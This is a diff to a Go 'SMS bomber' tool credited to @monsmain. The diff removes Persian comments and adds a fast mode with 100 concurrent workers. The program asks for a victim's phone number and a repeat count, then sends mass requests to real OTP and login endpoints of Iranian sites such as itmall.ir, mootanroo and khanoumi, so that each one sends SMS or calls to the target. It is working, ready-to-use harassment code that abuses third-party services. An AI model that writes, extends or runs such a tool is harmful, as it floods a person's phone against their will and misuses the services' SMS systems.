@@ -54,89 +54,85 @@ func clearScreen() {
 }
 
 func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
-	defer wg.Done() // wg.Done() همچنان در انتهای تابع فراخوانی میشود
+	defer wg.Done() 
 
-	const maxRetries = 3             // حداکثر تعداد تلاش مجدد
-	const retryDelay = 2 * time.Second // فاصله زمانی بین تلاش‌های مجدد
+	const maxRetries = 3          
+	const retryDelay = 2 * time.Second 
 
 	for retry := 0; retry < maxRetries; retry++ {
 		select {
-		case <-ctx.Done(): // اگر Context لغو شده بود، از حلقه تلاش مجدد خارج شو
+		case <-ctx.Done(): 
 			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
-			ch <- 0 // سیگنال لغو
+			ch <- 0 
 			return
 		default:
-			// ادامه اجرای حلقه اگر Context لغو نشده باشد
 		}
 
 		jsonData, err := json.Marshal(payload)
 		if err != nil {
 			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
-			if retry == maxRetries-1 { // اگر آخرین تلاش هم ناموفق بود
+			if retry == maxRetries-1 { 
 				ch <- http.StatusInternalServerError
 				return
 			}
 			time.Sleep(retryDelay)
-			continue // برو به تلاش بعدی
+			continue 
 		}
 
 		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
 		if err != nil {
 			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
-			if retry == maxRetries-1 { // اگر آخرین تلاش هم ناموفق بود
+			if retry == maxRetries-1 { 
 				ch <- http.StatusInternalServerError
 				return
 			}
 			time.Sleep(retryDelay)
-			continue // برو به تلاش بعدی
+			continue 
 		}
 		req.Header.Set("Content-Type", "application/json")
 
 		resp, err := http.DefaultClient.Do(req)
 		if err != nil {
-			// بررسی نوع خطا برای تلاش مجدد
 			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
 				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
 				if retry == maxRetries-1 {
 					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
-					ch <- http.StatusInternalServerError // یا شاید کد خطای دیگری برای خطاهای شبکه
+					ch <- http.StatusInternalServerError 
 					return
 				}
 				time.Sleep(retryDelay)
-				continue // برو به تلاش بعدی
+				continue 
 			} else if ctx.Err() == context.Canceled {
 				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
-				ch <- 0 // سیگنال لغو
+				ch <- 0 
 				return
 			} else {
-				// خطای غیرمنتظره یا غیرمرتبط با شبکه که نباید تلاش مجدد شود
 				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
 				ch <- http.StatusInternalServerError
 				return
 			}
 		}
 
-		// اگر درخواست موفق بود (بدون خطا در ارسال)، وضعیت را میفرستیم و خارج میشویم
 		ch <- resp.StatusCode
-		resp.Body.Close() // بستن بدنه پاسخ پس از استفاده
-		return // درخواست موفق بود، نیازی به تلاش مجدد نیست
+		resp.Body.Close() 
+		return 
 	}
 }
 
 func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
-	defer wg.Done() // wg.Done() همچنان در انتهای تابع فراخوانی میشود
+	defer wg.Done()
 
-	const maxRetries = 3             // حداکثر تعداد تلاش مجدد
-	const retryDelay = 3 * time.Second // فاصله زمانی بین تلاش‌های مجدد
+	const maxRetries = 3           
+	const retryDelay = 3 * time.Second 
 
 	for retry := 0; retry < maxRetries; retry++ {
 		select {
-		case <-ctx.Done(): // اگر Context لغو شده بود، از حلقه تلاش مجدد خارج شو
+		case <-ctx.Done(): 
 			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
-			ch <- 0 // سیگنال لغو
+			ch <- 0 
 			return
 		default:
-			// ادامه اجرای حلقه اگر Context لغو نشده باشد
+
 		}
 
 		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
@@ -186,47 +182,48 @@ func main() {
 
 	fmt.Print("\033[01;32m")
 	fmt.Print(`
-                                :-.                                   
-                         .:   =#-:-----:                              
-                           **%@#%@@@#*+==:                            
-                       :=*%@@@@@@@@@@@@@@%#*=:                        
-                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
-                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
-              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
-             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
-            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
-            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
-           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
+                                :-.                                   
+                         .:   =#-:-----:                              
+                           **%@#%@@@#*+==:                            
+                       :=*%@@@@@@@@@@@@@@%#*=:                        
+                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
+                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
+              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
+             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
+            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
+            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
+           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
 `)
 	fmt.Print("\033[01;37m")
 	fmt.Print(`
-           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
-           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
-           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
-           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
-            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
-            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
-             *@@%#            -@@@@@@.            #@@@+             
-             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
-              :@@*           =%@@@@@@%-   faster   *@@:              
-              #@@%         .*@@@@#%@@@%+.         %@@+              
-              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
+           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
+           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
+           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
+           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
+            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
+            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
+            *@@%#             -@@@@@@.            #@@@+             
+             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
+             :@@*            =%@@@@@@%-  faster    *@@:              
+              #@@%         .*@@@@#%@@@%+.         %@@+              
+              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
 `)
 	fmt.Print("\033[01;31m")
 	fmt.Print(`
-              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
-               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
-                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
-                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
-                      #@@@@@@@@@@@@@@@@@@@@@@+                      
-                       *@@@@@@@@@@@@@@@@@@@@+                       
-                        +@@%*@@%@@@%%@%*@@%=                         
-                         +%+ %%.+@%:-@* *%-                          
-                          .  %# .%#  %+                              
-                             :.  %+  :.                              
-                                 -:                                  
+              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
+               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
+                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
+                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
+                      #@@@@@@@@@@@@@@@@@@@@@@+                      
+                       *@@@@@@@@@@@@@@@@@@@@+                       
+                        +@@%*@@%@@@%%@%*@@%=                         
+                         +%+ %%.+@%:-@* *%-                          
+                          .  %# .%#  %+                              
+                             :.  %+  :.                              
+                                 -:                                  
 `)
 	fmt.Print("\033[0m")
+
 
 	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
@@ -237,6 +234,28 @@ func main() {
 	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
 	fmt.Scan(&repeatCount)
 
+	var speedChoice string
+	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
+	fmt.Scan(&speedChoice)
+
+	var numWorkers int 
+
+	switch strings.ToLower(speedChoice) { 
+	case "fast":
+
+		numWorkers = 100 
+		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
+	case "medium":
+
+		numWorkers = 30 
+		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
+	default:
+
+		numWorkers = 30 
+		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
+	}
+
+
 	ctx, cancel := context.WithCancel(context.Background())
 	signalChan := make(chan os.Signal, 1)
 
@@ -245,69 +264,61 @@ func main() {
 	go func() {
 		<-signalChan
 		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
-		cancel() 
+		cancel()
 	}()
 
-	tasks := make(chan func(), repeatCount*40) 
+	tasks := make(chan func(), repeatCount*40)
 
-
-	numWorkers := 20
 
 	var wg sync.WaitGroup
-	ch := make(chan int, repeatCount*40) 
+
+	ch := make(chan int, repeatCount*40)
 
 	for i := 0; i < numWorkers; i++ {
 		go func() {
 			for task := range tasks {
-				task() 
+				task()
 			}
 		}()
 	}
 
 	for i := 0; i < repeatCount; i++ {
-		
-              
-
-
-
-// 2. itmall.ir (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد
+		// 2. itmall.ir (Form)
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
 			formData.Set("action", "digits_check_mob")
 			formData.Set("countrycode", "+98")
-			formData.Set("mobileNo", phone) // استفاده از متغیر phone
-			formData.Set("csrf", "e57d035242") // ممکن است نیاز به تولید دینامیک داشته باشد
+			formData.Set("mobileNo", phone)
+			formData.Set("csrf", "e57d035242")
 			formData.Set("login", "2")
-			formData.Set("username", "") // طبق payload شما
-			formData.Set("email", "")   // طبق payload شما
-			formData.Set("captcha", "") // طبق payload شما
-			formData.Set("captcha_ses", "") // طبق payload شما
+			formData.Set("username", "")
+			formData.Set("email", "")
+			formData.Set("captcha", "")
+			formData.Set("captcha_ses", "")
 			formData.Set("json", "1")
 			formData.Set("whatsapp", "0")
 			sendFormRequest(ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
 		}
-
 		// 3. api.mootanroo.com (JSON)
 		wg.Add(1)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://api.mootanroo.com/api/v3/auth/fadce78fbac84ba7887c9942ae460e0c/send-otp", map[string]interface{}{
-				"PhoneNumber": phone, // استفاده از متغیر phone
+				"PhoneNumber": phone, 
 			}, &wg, ch)
 		}
 
-		// 4. accounts.khanoumi.com (Form) - ساختار payload شبیه Form Data است
+		// 4. accounts.khanoumi.com (Form)
 		wg.Add(1)
 		tasks <- func() {
 			formData := url.Values{}
-			formData.Set("applicationId", "b92fdd0f-a44d-4fcc-a2db-6d955cce2f5e") // ممکن است نیاز به تولید دینامیک داشته باشد
-			formData.Set("loginIdentifier", phone) // استفاده از متغیر phone
+			formData.Set("applicationId", "b92fdd0f-a44d-4fcc-a2db-6d955cce2f5e") 
+			formData.Set("loginIdentifier", phone) 
 			formData.Set("loginSchemeName", "sms")
 			sendFormRequest(ctx, "https://accounts.khanoumi.com/account/login/init", formData, &wg, ch)
 		}
 
-// virgool.io (JSON) - این payload عجیب است، احتمالاً باید JSON باشد اما کلید مالفورم است
-		// فرض میکنیم منظور {"method": "phone", "identifier": phone} بوده
+                // virgool.io (JSON) 
 		wg.Add(1)
 		tasks <- func() {
 			sendJSONRequest(ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
@@ -595,18 +606,15 @@ func main() {
 		}
 	}
 
-	
 	close(tasks)
-
 
 	go func() {
 		wg.Wait()
 		close(ch)
 	}()
 
-	// پردازش کدهای وضعیت دریافت شده از کانال ch
 	for statusCode := range ch {
-		if statusCode >= 400 || statusCode == 0 { // کد وضعیت 0 برای درخواست های لغو شده توسط Context
+		if statusCode >= 400 || statusCode == 0 {
 			fmt.Println("\033[01;31m[-] Error or Canceled!")
 		} else {
 			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
